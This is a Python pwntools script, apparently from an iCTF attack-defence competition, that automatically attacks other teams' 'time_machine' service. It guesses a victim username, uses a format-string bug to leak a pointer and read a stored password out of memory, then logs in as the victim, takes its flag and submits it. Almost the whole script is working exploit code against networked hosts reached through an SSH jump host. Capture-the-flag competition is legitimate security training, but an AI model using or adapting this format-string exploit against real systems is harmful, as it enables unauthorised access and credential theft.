from pwn import *
import ictf
import random

i = ictf.iCTF()
t = i.login("XXXXXXXXXXXXXXXXX","XXXXXXXXXXXXXXXXXXXXXXXXX")


def gen_username(flag_id):
    LEGITIMATE_USERNAME = ["LetMeFly","TryThis","DogHater","test0001","fanqiang","l33tM0rE","sH3Rl0cK","d0YleCon"]
    import md5
    m = md5.new()
    m.update(flag_id)
    digest = m.hexdigest()
    index = int(digest, 16) % len(LEGITIMATE_USERNAME)
    return LEGITIMATE_USERNAME[index] + digest[0 : 10] 

service = [s for s in t.get_service_list() if s['service_name'] == "time_machine"][0]

ss = ssh(host="35.165.220.138", port=1515,user="ctf", keyfile="../ssh_key")
flags = []

targets = t.get_targets(service['service_id'])['targets']
random.shuffle(targets)

i = 30
for target in targets:
	try:
		print target['team_name'], target['hostname'], target['port']

		if target['team_name'] in ["KLTM"]:
			continue
		s = ss.connect_remote(target['hostname'], target['port'], timeout=1)

		flagname = gen_username(target['flag_id'])

		s.sendline("L")
		s.sendline(flagname)
		s.sendline("ABC")

		s.sendline("R")
		username = randoms(10)
		password = randoms(10)

		s.sendline(username)
		s.sendline(password)
		s.sendline(randoms(10))

		s.sendline("L")
		s.sendline(username)
		s.sendline(password)

		s.sendline("G")
		s.sendline("1")

		s.sendline("%%%d$p"%i)
		s.recvuntil("journey to ")
		ptr = int(s.recvline().strip(),16)

		s.sendline("%d" % 0xffffffff)

		s.sendline("G")
		s.sendline("1")

		s.sendline("%17$s---"+p64(ptr-0x20))
		s.recvuntil("journey to ")
		password = s.recvuntil("---")[:-3]
		s.sendline("A")

		s.sendline("L")
		s.sendline("L")
		s.sendline(flagname)
		s.sendline(password)
		s.recvuntil("voucher: ")
		flag = s.recvline().strip()
		flags.append(flag)
		if len(flags)>15:
			print t.submit_flag(flags)
			flags = []

	except Exception as e:
		print "BROKE!"
		print t.submit_flag(flags)
		ss = ssh(host="52.37.24.67", port=1581,user="ctf", keyfile="../ssh_key")
		flags = []

print t.submit_flag(flags)
